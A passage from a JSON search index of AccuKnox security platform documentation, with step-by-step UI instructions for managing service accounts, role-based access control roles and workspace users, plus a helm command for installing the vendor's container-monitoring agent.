clusters.</p>"},{"location":"workspace-manager/manage-onboarded-clusters/#6-data-protection","title":"6. Data Protection","text":"<p>Installation Guide</p> <p>Description  Trains a model based on container workload type. It constantly monitors the syscalls happening inside the container. After training, if the vae sees syscalls happening in a way not seen in training phase, it will send high reconstruction error with detailed forensics information.</p> <p>To Install agents on destination cluster <pre><code>helm upgrade --install knox-containersec-chart accuknox-agents/knox-containersec-chart -n accuknox-agents\n</code></pre></p>"},{"location":"workspace-manager/manage-service-account/","title":"Manage service accounts","text":""},{"location":"workspace-manager/manage-service-account/#edit-a-service-account","title":"Edit a Service Account","text":"<ol> <li>Log in to Accuknox and select <code>Manage Service Accounts</code> from the <code>Workspace Manager</code> menu. </li> <li>Click the <code>Edit</code> button.</li> <li>Enter the new Service account name.</li> <li>Click Save Changes.</li> </ol>"},{"location":"workspace-manager/manage-service-account/#delete-a-service-account","title":"Delete a Service Account","text":"<ol> <li>Log in to Accuknox and select <code>Manage Service Accounts</code> from the <code>Workspace Manager</code> menu. </li> <li>Click the <code>Delete</code> button.</li> <li>Click Delete to delete the Instance Group, or click Cancel to revert the unsaved changes.</li> </ol>"},{"location":"workspace-manager/role_based_access_control/","title":"Role-based access control","text":""},{"location":"workspace-manager/role_based_access_control/#steps-to-be-followed-in-role-based-access-control","title":"Steps to be followed in Role-Based Access Control","text":"<p>Select the Workspace Manager &gt; Role-Based Access Control. This is the second subsection of workspace manager. This subsection is used to assign the existing roles access permissions, or you can create new roles. This subsection is divided into 7 stages,</p> <ul> <li>Cluster Management</li> <li>Policy Management</li> <li>Account Management</li> <li>Data Protection</li> <li>Anomaly Detection</li> <li>User Management</li> <li>Data Pipeline</li> </ul>"},{"location":"workspace-manager/role_based_access_control/#step-1-user-management","title":"Step 1 - User Management","text":"<p>Select the Workspace Manager -&gt; Role-Based Access Control &gt; User Management stage. This stage is used to assign the existing roles access permissions for Users in granular level.</p> <p></p> <p>Here you can use existing roles or you can create custom roles. Click the Create Custom Role button.</p> <p></p> <p>It will show Create a New Role dialog box. Here you can see two input fields. First field enter your New custom role name then the second field click the dropdown box and select your role type and Click Next button.</p> <p>Now you have to set Granular Roles for your new custom role then click the Save button.</p> <p></p> <p>Once you click the save button It will show the confirmation dialog box. Here you have two options: Cancel and Create.</p> <p>If you don\u2019t want to create a new role then click the Cancel button, Otherwise click the Create button it will create your new custom role.</p>"},{"location":"workspace-manager/role_based_access_control/#step-2-cluster-management","title":"Step 2 - Cluster Management","text":"<p>Select the Workspace Manager -&gt; Role-Based Access Control &gt; Cluster Management stage. This stage is used to assign the existing roles access permissions for Cluster Management. Here you can also create custom roles for Policy Management.</p> <p></p>"},{"location":"workspace-manager/role_based_access_control/#step-3-policy-management","title":"Step 3 - Policy Management","text":"<p>Select the Workspace Manager &gt; Role-Based Access Control -&gt; Policy Management stage. This stage is used to assign the existing roles access permissions for Policy Management. Here you can also create custom roles for Policy Management.</p> <p></p>"},{"location":"workspace-manager/role_based_access_control/#step-4-account-management","title":"Step 4 - Account Management","text":"<p>Select the Workspace Manager -&gt; Role-Based Access Control -&gt; Account Management stage. This stage is used to assign the existing roles access permissions for Account Management. Here you can also create custom roles for Account Management.</p> <p></p>"},{"location":"workspace-manager/role_based_access_control/#step-5-data-protection","title":"Step 5 - Data Protection","text":"<p>Select the Workspace Manager -&gt; Role-Based Access Control -&gt; Data Protection stage. This stage is used to assign the existing roles access permissions for Data Protection. Here you can also create custom roles for Data Protection.</p> <p></p>"},{"location":"workspace-manager/role_based_access_control/#step-6-anomaly-detection","title":"Step 6 - Anomaly Detection","text":"<p>Select the Workspace Manager -&gt; Role-Based Access Control -&gt; Anomaly Detection stage. This stage is used to assign the existing roles access permissions for Anomaly Detection. Here you can also create custom roles for Anomaly Detection.</p> <p></p>"},{"location":"workspace-manager/role_based_access_control/#step-7-data-pipeline","title":"Step 7 - Data Pipeline","text":"<p>Select the Workspace Manager -&gt; Role-Based Access Control -&gt; Data Pipeline stage. This stage is used to assign the existing roles access permissions for Data Pipeline. Here you can also create custom roles for Data Pipeline.</p> <p></p>"},{"location":"workspace-manager/user_management/","title":"User Management","text":""},{"location":"workspace-manager/user_management/#invite-and-create-a-user","title":"Invite and Create a User","text":"<ol> <li>Log in to Accuknox as administrator and select <code>User Management</code>     from the <code>Workspace Manager</code> menu.   </li> <li>Click the <code>Invite users to workspace</code> button.</li> </ol> <p>On the <code>Workspace Manager</code> page, under <code>User Management</code>, click <code>Invite users to workspace</code>. You can view the following options:</p> <ul> <li>Invite User </li> <li>Create User </li> <li>Add Users in Bulk</li> </ul>"},{"location":"workspace-manager/user_management/#invite-user","title":"Invite User","text":"<ol> <li>Select <code>Invite User</code> </li> <li>Enter the user\u2019s email address</li> <li>Select the Role</li> </ol> <p> 4. Click Invite to send the user invite, or click Cancel to discard the user.</p>"},{"location":"workspace-manager/user_management/#create-user","title":"Create User","text":"<ol> <li>Select <code>Create User</code> </li> <li>Enter the user\u2019s first name and last name and email address.</li> <li>Select the Role</li> </ol> <p>  4. Click Invite to send the user invite, or click Cancel to discard the user.</p>"},{"location":"workspace-manager/user_management/#add-users-in-bulk","title":"Add Users in Bulk","text":"<ol> <li>Select <code>Add Users in Bulk</code></li> </ol> <p>  2. Download the sample CSV file.   3. Open and enter the user\u2019s first name and last name and email address, role in the downloaded CSV template.  4. Upload the CSV file.  5. Click Invite to send the user invite, or click Cancel to discard the user.   </p>"},{"location":"workspace-manager/user_management/#edit-user-information","title":"Edit User Information","text":"<p>To edit an existing user:</p> <ol> <li>Log in to Accuknox as administrator and select <code>User Management</code>     from the <code>Workspace Manager</code> menu. </li> <li>Select <code>Users in the workspace</code>. </li> <li>Select the user from the <code>Users in the workspace</code> table.</li> <li>Optional: Edit the email address.   </li> <li>Optional: Edit the first name / last name. </li> <li>Optional: Toggle the Role switch to change the roles.</li> <li>Click Confirm to save the changes, or Cancel to revert the unsaved changes.</li> </ol>"},{"location":"workspace-manager/user_management/#deactivate-a-user","title":"Deactivate a User","text":"<p>To deactivate an existing user:</p> <ol> <li>Log in to Accuknox as administrator and select <code>User Management</code>     from the <code>Workspace Manager</code> menu. </li> <li>Select <code>Users in the workspace</code>. </li> <li>Select the user from the <code>Users in the workspace</code> table.</li> <li>Click Deactivate User.</li> </ol>"},{"location":"workspace-manager/user_management/#activate-a-user","title":"Activate a User","text":"<p>To activate an existing deactivated user:</p> <ol> <li>Log in to Accuknox as administrator and select <code>User Management</code>     from the <code>Workspace Manager</code> menu.</li> <li>Select <code>Deactivated Users</code>.</li> <li>Select the user from the <code>Deactivated Users</code> table.</li> <li>Click Activate User.</li> </ol>"},{"location":"workspace-manager/user_management/#delete-a-user","title":"Delete a User","text":"<p>To delete an existing user:</p> <ol> <li>Log in to Accuknox as administrator and select <code>User Management</code>     from the <code>Workspace Manager</code> menu.</li> <li>Select <code>Users in the workspace</code>.</li> <li>Select the user from the <code>Users in the workspace</code> table.</li> <li>Click Delete User.</li> <li>Click delete to confirm the change.</li> </ol>"},{"location":"workspace-manager/user_management/#re-invite-a-user","title":"Re-invite a User","text":"<p>To resend or delete a pending invite:</p> <ol> <li>Log in to Accuknox as administrator and select <code>User Management</code>     from the <code>Workspace Manager</code> menu.</li> <li>Select <code>Pending Invites</code>.</li> <li>Select the user from the <code>Pending Invites</code> table.</li> <li>Click Resend or  Cancel to delete the pending invitation</li> <li>Click confirm or delete to do the respective procedure.</li> </ol>"}]}